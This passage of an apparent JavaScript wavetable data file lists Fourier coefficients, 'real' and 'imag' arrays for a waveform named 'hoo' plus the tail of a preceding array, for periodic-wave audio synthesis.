-.000148, -.000118, .000104, .000058, -.000093, -.000217, -.000153, -.000159, -.000116, -.000134, -.000078, -.000215, -.000206, .000099, -.000054, -.000095, .000029, -.000054, .000009, -.000064, -.000038, -.000046, -.000145, -.000362, -.00014, -.000172, -.000209, -.000191, -.000257, -.000252, -.000234, -.000525, -.00026, -.000337, .000005, .000083, .000142, -.000229, -.000192, .000069, .000069, .000006, -.000001, -.000011, .000027, .000008, .000009, .000003, .000004, .000022, .000025, .00004, .000038, .000034, .000036, .000037, .000033, .000028, .000026, .000023, .00002, .000016, .000012, .000009, .000008, .000006, .000005, .000003, .000004, .000003, .000003, .000002, .000003, .000003, .000002, .000002, .000002, .000003, .000002, .000002, .000002, .000002, .000002, .000001, .000002, .000002, .000002, .000001, .000002, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000002, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, .000001, 0, .000001, .000001, 0, 0, .000001, .000001, 0, 0, .000001, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "hoo",         { real: [ 0, -.370874, .288281, -.454893, .061559, .049432, -.012918, .129553, -.041687, -.012594, -.006316, .00813, .000601, -.000181, -.005799, .000374, -.000806, .000236, -.001341, .000891, .000361, .000822, -.000374, .0006, .000703, -.002483, .002295, -.000217, .00045, -.00019, .000034, -.000237, .000719, -.000872, .000771, -.000461, .000487, -.000296, -.000324, .000094, -.000297, .000801, -.000836, .000114, .000064, .000199, -.000033, -.000051, -.000107, -.000221, -.000052, .000198, -.000028, -.000199, .000055, -.000105, -.000255, -.00014, .000114, -.000041, -.000117, .000085, -.000033, -.000004, .000011, -.000273, -.000059, -.000038, -.000255, .000055, -.000013, .000089, -.000059, .000164, .000091, .000001, .00007, -.000004, .000151, -.000148, .000486, -.000242, .000123, -.00005, -.00015, .000053, -.000109, .000183, -.000181, .000331, -.000187, .000227, -.000157, .000145, .000079, -.000158, -.000039, -.000118, .000027, -.000315, .000324, -.000773, .000717, -.000255, -.000114, -.000174, -.000084, -.000107, .00003, -.000092, -.000038, -.00001, -.000173, .000146, -.000033, -.000415, .000811, -.000489, .000142, -.00009, .000044, -.000171, .000034, -.000026, -.000217, -.000042, -.000131, .000229, -.000262, .000534, -.001005, .000352, .000284, -.000795, .000905, -.000018, -.000307, .000268, -.000369, .00047, -.00035, .000241, -.000347, .000472, -.000438, .000056, .000835, -.00025, .000228, -.000023, -.000927, .000283, -.000599, .00017, -.000008, .00022, -.000072, .000262, -.000139, .000048, -.000117, .00016, -.000168, .000174, -.000239, .000141, -.000023, -.000095, .000147, -.000017, -.000049, .000112, .000071, -.000373, .000062, .00012, -.000049, .000005, -.000099, .00001, -.000004, -.000051, .000254, -.000079, -.000125, .000128, -.000043, -.000037, -.000002, .000015, -.000069, .000221, -.000129, .00002, .000037, -.000071, .000027, -.000023, -.000007, -.000008, .000021, -.000001, .000006, .000011, .000011, .000001, -.000005, .000003, -.000004, .000001, .000001, -.000007, -.000006, -.000007, -.000007, -.000007, -.000007, -.000007, -.000007, -.000006, -.000005, -.000005, -.000005, -.000004, -.000003, -.000004, -.000004, -.000003, -.000003, -.000003, -.000003, -.000003, -.000002, -.000003, -.000003, -.000002, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, 0, 0, -.000001, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, .046536, .256926, .019372, -.496196, .016047, -.063615, .021345, -.007871, -.020463, .009909, .003165, -.000942, -.002837, .002435, -.003583, .001061, -.002121, -.00013, .000233, -.00032, .000087, .00095, -.001264, .002961, -.000701, .000715, .000451, -.000291, .000048, .000166, -.000528, .000677, -.000218, -.000003, -.00028, -.000135, .000574, -.000348, .000214, -.00044, .000625, .001131, -.000147, .000135, -.000206, -.000013, -.000018, -.000061, -.000043, .00012, .000051, -.000039, .000039, .000068, -.000041, -.000088, -.00007, .000099, -.000165, .000194, -.000161, -.000109, -.000013, -.000071, .000097, -.000165, -.000033, .000068, .000003, .000068, -.000104, .000159, -.000107, .000065, .000007, .000123, -.000005, -.000101, -.000075, .000024, .000528, -.000422, .000479, -.000171, -.000048, -.00015, .00035, -.000185, -.000023, .000163, .000053, -.000016, .000018, -.000264, .000025, -.000246, -.000067, -.000231, .000039, -.000093, .000095, .000045, .00045, -.000697, .00017, .000055, -.00016, .00012, .000118, -.00007, .000054, .000057, -.000246, .000253, -.000389, .000138, -.000053, .000014, -.000032, -.000162, .000048, -.000089, -.000145, -.000163, .000127, .000215, -.000009, -.000012, .000117, .000425, -.000036, .000827, -.001058, -.000607, .000224, .000075, -.000086, -.00014, .000358, -.000212, .000479, -.000007, -.000196, .000109, .000138, .000173, .000108, -.000153, .000167, -.000805, .000246, -.00006, -.000009, .000113, -.000008, .000042, -.000097, -.00003, .000144, -.00013, .000154, .000024, .000062, -.000026, -.000145, .000156, -.000205, .000047, .000042, -.000049, -.00007, .000232, -.000152, -.000228, .00021, -.000025, .000046, -.000051, .000131, -.000038, -.000125, .000053, .000214, -.000195, .000066, .000045, -.000026, .000015, .000001, -.000146, .000059, .000115, -.000094, .000138, 0, .000007, -.000025, .000013, .000011, .000002, .000016, -.000017, -.000014, -.000017, -.000005, -.000008, -.000006, -.000008, -.000018, -.000007, -.000008, -.00001, -.000009, -.000006, -.000004, -.000004, -.000003, -.000002, -.000001, -.000001, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 